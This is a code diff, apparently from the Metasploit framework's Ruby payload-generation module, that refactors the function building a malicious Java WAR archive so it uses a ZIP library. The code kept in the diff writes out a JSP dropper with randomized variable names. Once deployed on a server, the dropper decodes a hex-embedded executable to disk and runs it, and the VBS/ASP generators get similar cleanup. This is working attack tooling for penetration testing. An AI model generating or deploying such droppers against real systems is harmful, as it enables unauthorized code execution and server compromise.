@@ -16,6 +16,7 @@ class EXE
 require 'rex'
 require 'rex/peparsey'
 require 'rex/pescan'
+require 'rex/zip'
 require 'metasm'
 
 	##
@@ -459,15 +460,15 @@ require 'metasm'
 		exe = exes.unpack('C*')
 		vbs = ""
 
-		var_bytes   =  Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
-		var_fname   =  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_func    =  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_stream  =  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_obj     =  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_shell   =  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_tempdir =  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_tempexe =  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_basedir =  Rex::Text.rand_text_alpha(rand(8)+8)
+		var_bytes   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
+		var_fname   = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_func    = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_stream  = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_obj     = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_shell   = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
 
 		vbs << "Function #{var_func}()\r\n"
 
@@ -518,15 +519,15 @@ require 'metasm'
 		exe = exes.unpack('C*')
 		vbs = "<%\r\n"
 
-		var_bytes   =  Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
-		var_fname   =  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_func    =  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_stream  =  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_obj     =  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_shell   =  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_tempdir =  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_tempexe =  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_basedir =  Rex::Text.rand_text_alpha(rand(8)+8)
+		var_bytes   = Rex::Text.rand_text_alpha(rand(4)+4) # repeated a large number of times, so keep this one small
+		var_fname   = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_func    = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_stream  = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_obj     = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_shell   = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)
 
 		vbs << "Sub #{var_func}()\r\n"
 
@@ -576,142 +577,33 @@ require 'metasm'
 	def self.to_win32pe_asp(framework, code, opts={})
 		to_exe_asp(to_win32pe(framework, code, opts), opts)
 	end
-	
+
 	# Creates a Web Archive (WAR) file containing a jsp page and hexdump of a payload.
 	# The jsp page converts the hexdump back to a normal .exe file and places it in
 	# the temp directory. The payload .exe file is then executed.
 	def self.to_jsp_war(framework, arch, plat, code='', opts={})
 
-		# header references from http://www.pkware.com/documents/casestudies/APPNOTE.TXT
-		header = {
-			'Signature' =>			0x04034b50,
-			'Version' => 				0x0014,
-			'GPBF' => 					0x0008,
-			'Compression' =>			0x0008,
-			'LastModTime' =>			0x1139,
-			'LastModDate' =>			0x3b98,
-			'CRC' =>				0x00000000,
-			'CompressedSize' => 	0x00000000,
-			'UncompressedSize' =>	0x00000000,
-			'FilenameLen' =>			0x0000,
-			'ExtrafieldLen' =>			0x0000,
-			'Filename' =>					"",
-		}
-		
-		header_pack = 'VvvvvvVVVvvA*'
-		
-		data_descriptor = {
-			'Signature' =>			0x08074b50,
-			'CRC' =>				0x00000000,
-			'CompressedSize' => 	0x00000000,
-			'UncompressedSize' =>	0x00000000,
-		}
-		
-		dd_pack = 'VVVV'
-		
-		central_dir = {
-			'Signature' =>  		0x02014b50,
-			'VersionMade' =>     		0x0000,
-			'VersionNeeded' =>			0x0000,
-			'GPBF' =>					0x0000,
-			'Compression' =>			0x0008,
-			'LastModTime' =>			0x1139,
-			'LastModDate' =>			0x3b98,
-			'CRC' =>				0x00000000,
-			'CompressedSize' => 	0x00000000,
-			'UncompressedSize' =>	0x00000000,
-			'FilenameLen' =>			0x0000,
-			'ExtrafieldLen' =>			0x0000,
-			'FileCommentLen' =>			0x0000,
-			'DiskNumStart' =>			0x0000,
-			'InternalFileAttr' =>		0x0000,
-			'ExternalFileAttr' =>	0x00000020,
-			'OffsetInHeader' =>		0x00000000,
-			'Filename' =>					""
-		}
-		
-		cd_pack = 'VvvvvvvVVVvvvvvVVA*'
-		
-		end_central_dir = {
-			'Signature' =>				0x06054b50,
-			'NumberOfThisDisk' =>			0x0000,
-			'NumberOfDiskCFD' =>			0x0000,
-			'NumerOfCFDEntries' =>			0x0005,
-			'TotalCFDEntries' =>			0x0005,
-			'SizeOfCFD' =>				0x00000000,
-			'OffsetToStartCFD' =>		0x00000000,
-			'ZipCommentLen' =>				0x0000
-		}
-		
-		ecd_pack = 'VvvvvVVv'
-		
 		exe = to_executable(framework, arch, plat, code, opts)
 		var_payload = Rex::Text.rand_text_alpha_lower(rand(8)+8)
 		var_name = Rex::Text.rand_text_alpha_lower(rand(8)+8)
 
-		war = ""
-		
-		# begin meta-inf/
-		fname = "META-INF/"
-		metainf_offset = 0
-		metainf = header.dup
-		metainf['Filename'] = fname
-		metainf['FilenameLen'] = fname.size
-		metainf['CompressedSize'] = 0x00000002
-		metainf['ExtrafieldLen'] = 0x0004
+		zip = Rex::Zip::Archive.new
 
-		war << metainf.values.pack(header_pack)
-		war << [0x0000cafe].pack('V')
-		war << [0x0003].pack('v')
-		
-		metainfdd = data_descriptor
-		metainfdd['CompressedSize'] = 0x00000002
-		
-		war << metainfdd.values.pack(dd_pack)
+		# begin meta-inf/
+		minf = [ 0xcafe, 0x0003 ].pack('Vv')
+		zip.add_file('META-INF/', nil, minf)
 		# end meta-inf/
-		
+
 		# begin meta-inf/manifest.mf
-		fname = "META-INF/MANIFEST.MF"
-		manifest_offset = war.length
-		manifestraw = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
-		manifestcrc = Zlib.crc32(manifestraw, 0)
-		manifestdata = Rex::Text.zlib_deflate(manifestraw, Zlib::BEST_COMPRESSION)
-		
-		manifest = header.dup
-		manifest['CompressedSize'] = manifestdata.size - 6
-		manifest['UncompressedSize'] = manifestraw.size
-		manifest['FilenameLen'] = fname.size
-		manifest['Filename'] = fname
-		manifest['CRC'] = manifestcrc
-		
-		war << manifest.values.pack(header_pack)
-		war << manifestdata[2..(manifestdata.size-5)]
-		
-		manifestdd = data_descriptor
-		manifestdd['CRC'] = manifestcrc
-		manifestdd['CompressedSize'] = manifestdata.size-6
-		manifestdd['UncompressedSize'] = manifestraw.size
-		
-		war << manifestdd.values.pack(dd_pack)
+		mfraw = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
+		zip.add_file('META-INF/MANIFEST.MF', mfraw)
 		# end meta-inf/manifest.mf
-		
+
 		# begin web-inf/
-		fname = "WEB-INF/"
-		webinf_offset = war.length
-		webinf = header.dup
-		webinf['Version'] = 0x000a
-		webinf['GPBF'] = 0x0000
-		webinf['Compression'] = 0x0000
-		
-		webinf['FilenameLen'] = fname.size
-		webinf['Filename'] = fname
-		
-		war << webinf.values.pack(header_pack)
+		zip.add_file('WEB-INF/', '')
 		# end web-inf/
-		
+
 		# begin web-inf/web.xml
-		fname = "WEB-INF/web.xml"
-		webxml_offset = war.length
 		webxmlraw = %q{<?xml version="1.0" ?>
 <web-app xmlns="http://java.sun.com/xml/ns/j2ee"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
@@ -722,53 +614,32 @@ version="2.4">
 <servlet-name>NAME</servlet-name>
 <jsp-file>/PAYLOAD.jsp</jsp-file>
 </servlet>
-</web-app>}
+</web-app>
+}
 
 		webxmlraw.gsub!(/NAME/, var_name)
 		webxmlraw.gsub!(/PAYLOAD/, var_payload)
-		
-		webxmlcrc = Zlib.crc32(webxmlraw, 0)
-		webxmldata = Rex::Text.zlib_deflate(webxmlraw, Zlib::BEST_COMPRESSION)
-		
-		webxml = header.dup
-		webxml['CompressedSize'] = webxmldata.size - 6
-		webxml['UncompressedSize'] = webxmlraw.size
-		webxml['FilenameLen'] = fname.size
-		webxml['Filename'] = fname
-		webxml['CRC'] = webxmlcrc
-		
-		war << webxml.values.pack(header_pack)
-		war << webxmldata[2..(webxmldata.size-5)]
-		
-		webxmldd = data_descriptor.dup
-		webxmldd['CRC'] = webxmlcrc
-		webxmldd['CompressedSize'] = webxmldata.size - 6
-		webxmldd['UncompressedSize'] = webxmlraw.size
 
-		war << webxmldd.values.pack(dd_pack)
+		zip.add_file('WEB-INF/web.xml', webxmlraw)
 		# end web-inf/web.xml
-		
-		# begin <payload>.jsp
-		fname = "#{var_payload}.jsp"
-		jsp_offset = war.length
 
-		var_hexpath 	  	=  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_exepath 	  	=  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_data 		  	=  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_inputstream   	=  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_outputstream   	=  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_numbytes	  	=  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_bytearray	  	=  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_bytes		  	=  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_counter		  	=  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_char1		  	=  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_char2		  	=  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_comb		  	=  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_exe			  	=  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_hexfile		  	=  Rex::Text.rand_text_alpha(rand(8)+8)
-		var_proc		  	=  Rex::Text.rand_text_alpha(rand(8)+8)
-		
-		
+		# begin <payload>.jsp
+		var_hexpath       = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_exepath       = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_data          = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_inputstream   = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_outputstream  = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_numbytes      = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_bytearray     = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_bytes         = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_counter       = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_char1         = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_char2         = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_comb          = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_exe           = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_hexfile       = Rex::Text.rand_text_alpha(rand(8)+8)
+		var_proc          = Rex::Text.rand_text_alpha(rand(8)+8)
+
 		jspraw =  "<%@ page import=\"java.io.*\" %>\n"
 		jspraw << "<%\n"
 		jspraw << "String #{var_hexpath} = application.getRealPath(\"/\") + \"#{var_hexfile}.txt\";\n"
@@ -778,15 +649,15 @@ version="2.4">
 		jspraw << "if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\n"
 		jspraw << "#{var_exepath} = #{var_exepath}.concat(\".exe\");\n"
 		jspraw << "}\n"
-		
+
 		jspraw << "FileInputStream #{var_inputstream} = new FileInputStream(#{var_hexpath});\n"
 		jspraw << "FileOutputStream #{var_outputstream} = new FileOutputStream(#{var_exepath});\n"
-	
+
 		jspraw << "int #{var_numbytes} = #{var_inputstream}.available();\n"
 		jspraw << "byte #{var_bytearray}[] = new byte[#{var_numbytes}];\n"
 		jspraw << "#{var_inputstream}.read(#{var_bytearray});\n"
 		jspraw << "#{var_inputstream}.close();\n"
-	
+
 		jspraw << "byte[] #{var_bytes} = new byte[#{var_numbytes}/2];\n"
 		jspraw << "for (int #{var_counter} = 0; #{var_counter} < #{var_numbytes}; #{var_counter} += 2)\n"
 		jspraw << "{\n"
@@ -797,195 +668,22 @@ version="2.4">
 		jspraw << "#{var_comb} += Character.digit(#{var_char2}, 16) & 0xff;\n"
 		jspraw << "#{var_bytes}[#{var_counter}/2] = (byte)#{var_comb};\n"
 		jspraw << "}\n"
-		
+
 		jspraw << "#{var_outputstream}.write(#{var_bytes});\n"
 		jspraw << "#{var_outputstream}.close();\n"
-		
+
 		jspraw << "Process #{var_proc} = Runtime.getRuntime().exec(#{var_exepath});\n"
 		jspraw << "%>\n"
 
-		jspcrc = Zlib.crc32(jspraw, 0)
-		jspdata = Rex::Text.zlib_deflate(jspraw, Zlib::BEST_COMPRESSION)
-		
-		jsp = header.dup
-		jsp['CompressedSize'] = jspdata.size - 6
-		jsp['UncompressedSize'] = jspraw.size
-		jsp['FilenameLen'] = fname.size
-		jsp['Filename'] = fname
-		jsp['CRC'] = jspcrc
-		
-		war << jsp.values.pack(header_pack)
-		war << jspdata[2..(jspdata.size-5)]
-		
-		jspdd = data_descriptor.dup
-		jspdd['CRC'] = jspcrc
-		jspdd['CompressedSize'] = jspdata.size - 6
-		jspdd['UncompressedSize'] = jspraw.size
-
-		war << jspdd.values.pack(dd_pack)
+		zip.add_file("#{var_payload}.jsp", jspraw)
 		# end <payload>.jsp
-		
-		# begin <payload>.txt
-		fname = "#{var_hexfile}.txt"
-		payload_offset = war.length
-		payloadraw = exe.unpack("H*")[0]
-		
-		payloadcrc = Zlib.crc32(payloadraw, 0)
-		payloaddata = Rex::Text.zlib_deflate(payloadraw, Zlib::BEST_COMPRESSION)
-		
-		payload = header.dup
-		payload['CompressedSize'] = payloaddata.size - 6
-		payload['UncompressedSize'] = payloadraw.size
-		payload['FilenameLen'] = fname.size
-		payload['Filename'] = fname
-		payload['CRC'] = payloadcrc
-		
-		war << payload.values.pack(header_pack)
-		war << payloaddata[2..(payloaddata.size-5)]
-		
-		payloaddd = data_descriptor.dup
-		payloaddd['CRC'] = payloadcrc
-		payloaddd['CompressedSize'] = payloaddata.size - 6
-		payloaddd['UncompressedSize'] = payloadraw.size
 
-		war << payloaddd.values.pack(dd_pack)
+		# begin <payload>.txt
+		payloadraw = exe.unpack('H*')[0]
+		zip.add_file("#{var_hexfile}.txt", payloadraw)
 		# end <payload>.txt
 
-		
-		cfd_offset = war.length
-		cfd_begin = war.length
-
-		# begin central directory structure
-		# meta-inf/
-		fname = "META-INF/"
-		metainfcfd = central_dir.dup
-		metainfcfd['VersionMade'] = 0x0014
-		metainfcfd['VersionNeeded'] = 0x0014
-		metainfcfd['GPBF'] = 0x0008
-		metainfcfd['Compression'] = 0x0008
-		metainfcfd['CompressedSize'] = 0x00000002
-		metainfcfd['FilenameLen'] =	 fname.size
-		metainfcfd['ExtrafieldLen'] = 0x0004
-		metainfcfd['OffsetInHeader'] = metainf_offset
-		metainfcfd['Filename'] = fname
-		
-		war << metainfcfd.values.pack(cd_pack)
-		war << [0x0000cafe].pack('V') # extra field
-		# end central directory structure
-		# meta-inf/
-		
-		# begin central directory structure
-		# meta-inf/manifest.mf
-		fname = "META-INF/MANIFEST.MF"
-		manifestcfd = central_dir.dup
-		manifestcfd['VersionMade'] = 0x0014
-		manifestcfd['VersionNeeded'] = 0x0014
-		manifestcfd['GPBF'] = 0x0008
-		manifestcfd['CRC'] = manifestcrc
-		manifestcfd['Compression'] = 0x0008
-		manifestcfd['CompressedSize'] = manifestdata.length - 6
-		manifestcfd['UncompressedSize'] = manifestraw.length
-		manifestcfd['FilenameLen'] = fname.size
-		manifestcfd['ExtrafieldLen'] = 0x0000
-		manifestcfd['OffsetInHeader'] = manifest_offset
-		manifestcfd['Filename'] = fname
-		
-		war << manifestcfd.values.pack(cd_pack)
-		# end central directory structure
-		# meta-inf/manifest.mf
-		
-		# begin central directory structure
-		# web-inf/
-		fname = "WEB-INF/"
-		webinfcfd = central_dir.dup
-		webinfcfd['VersionMade'] = 0x0014
-		webinfcfd['VersionNeeded'] = 0x000a
-		webinfcfd['GPBF'] = 0x0000
-		webinfcfd['Compression'] = 0x0000
-		webinfcfd['FilenameLen'] = fname.size
-		webinfcfd['ExtrafieldLen'] = 0x0000
-		webinfcfd['OffsetInHeader'] = webinf_offset
-		webinfcfd['Filename'] = fname
-		
-		war << webinfcfd.values.pack(cd_pack)
-		# end central directory structure
-		# web-inf/
-
-		# begin central directory structure
-		# web-inf/web.xml
-		fname = "WEB-INF/web.xml"
-		webxmlcfd = central_dir.dup
-		webxmlcfd['VersionMade'] = 0x0014
-		webxmlcfd['VersionNeeded'] = 0x0014
-		webxmlcfd['GPBF'] = 0x0008
-		webxmlcfd['CRC'] = webxmlcrc
-		webxmlcfd['Compression'] = 0x0008
-		webxmlcfd['CompressedSize'] = webxmldata.length - 6
-		webxmlcfd['UncompressedSize'] = webxmlraw.length
-		webxmlcfd['FilenameLen'] = fname.size
-		webxmlcfd['ExtrafieldLen'] = 0x0000
-		webxmlcfd['OffsetInHeader'] = webxml_offset
-		webxmlcfd['Filename'] = fname
-		
-		war << webxmlcfd.values.pack(cd_pack)
-		# end central directory structure
-		# web-inf/web.xml
-
-		# begin central directory structure
-		# <payload>.jsp
-		fname = "#{var_payload}.jsp"
-		jspcfd = central_dir.dup
-		jspcfd['VersionMade'] = 0x0014
-		jspcfd['VersionNeeded'] = 0x0014
-		jspcfd['GPBF'] = 0x0008
-		jspcfd['CRC'] = jspcrc
-		jspcfd['Compression'] = 0x0008
-		jspcfd['CompressedSize'] = jspdata.length - 6
-		jspcfd['UncompressedSize'] = jspraw.length
-		jspcfd['FilenameLen'] = fname.size
-		jspcfd['ExtrafieldLen'] = 0x0000
-		jspcfd['OffsetInHeader'] = jsp_offset
-		jspcfd['Filename'] = fname
-		
-		war << jspcfd.values.pack(cd_pack)
-		# end central directory structure
-		# <payload>.jsp
-		
-		# begin central directory structure
-		# <payload>.exe
-		fname = "#{var_hexfile}.txt"
-		payloadcfd = central_dir.dup
-		payloadcfd['VersionMade'] = 0x0014
-		payloadcfd['VersionNeeded'] = 0x0014
-		payloadcfd['GPBF'] = 0x0008
-		payloadcfd['CRC'] = payloadcrc
-		payloadcfd['Compression'] = 0x0008
-		payloadcfd['CompressedSize'] = payloaddata.length - 6
-		payloadcfd['UncompressedSize'] = payloadraw.length
-		payloadcfd['FilenameLen'] = fname.size
-		payloadcfd['ExtrafieldLen'] = 0x0000
-		payloadcfd['OffsetInHeader'] = payload_offset
-		payloadcfd['Filename'] = fname
-		
-		war << payloadcfd.values.pack(cd_pack)
-
-		cfd_end = war.length
-		# end central directory structure
-		# <payload>.jsp
-
-		# end central directory header
-		endcfd = end_central_dir.dup
-		endcfd['NumberOfThisDisk'] = 0x0000
-		endcfd['NumberOfDiskCFD'] =	0x0000
-		endcfd['NumerOfCFDEntries'] = 0x0006
-		endcfd['TotalCFDEntries'] =	0x0006
-		endcfd['SizeOfCFD'] = cfd_end - cfd_begin # size of end central dir struct
-		endcfd['OffsetToStartCFD'] = cfd_offset
-		endcfd['ZipCommentLen'] = 0x0000
-		
-		war << endcfd.values.pack(ecd_pack)
-		
-		return war
+		return zip.pack
 	end
 
 
